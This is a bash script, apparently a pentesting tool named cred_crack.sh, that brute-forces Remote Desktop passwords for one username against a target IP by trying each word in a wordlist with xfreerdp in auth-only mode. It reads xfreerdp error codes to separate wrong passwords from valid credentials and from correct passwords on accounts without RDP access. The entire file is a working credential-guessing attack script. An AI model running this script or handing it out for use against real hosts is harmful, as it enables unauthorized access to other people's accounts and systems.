
#!/bin/bash

#Somebody has already done this probably
#You can use the errors messages of xfreerdp to find the passwords of RDP Users, and Non-RDP users
#Example:
# freerdp_set_last_error ERRCONNECT_LOGON_FAILURE - For incorrect password
# freerdp_set_last_error ERRCONNECT_ACCOUNT_DISABLED - For a non-RDP User
# exit status 0 - For a valid username and password

#TO DO: Allow wordlist of usernames

if [ $# -lt 3 ]
then
   echo "USAGE ./cred_crack.sh [username] [password list] [IP ADDRESS]"
else
   username=$1
   wordlist=$2 
   ip=$3
   for word in $(cat $wordlist)
    do
      resp=$(xfreerdp /u:$username /p:$word /v:$ip +auth-only 2>&1)
      exitstatus=$(echo "$resp" | grep -c "exit status 1" 2>&1)
      if [ "$exitstatus" = "0" ]; then
        echo "RDP USER"
        echo "Username: $username"
        echo "Password: $word"
      	break
      else
        error_code=$(echo $resp | grep -oPm1 "set_last_error (.*)" | cut -f2 -d' ')
        if [ "$error_code" = "ERRCONNECT_LOGON_FAILURE" ]; then
           echo "Invalid Credentials, $error_code"
        else
           echo "Candidate Credentials"
           echo "$error_code"
           echo "Username: $username"
           echo "Password: $word"
           break
        fi
      fi
   done
fi

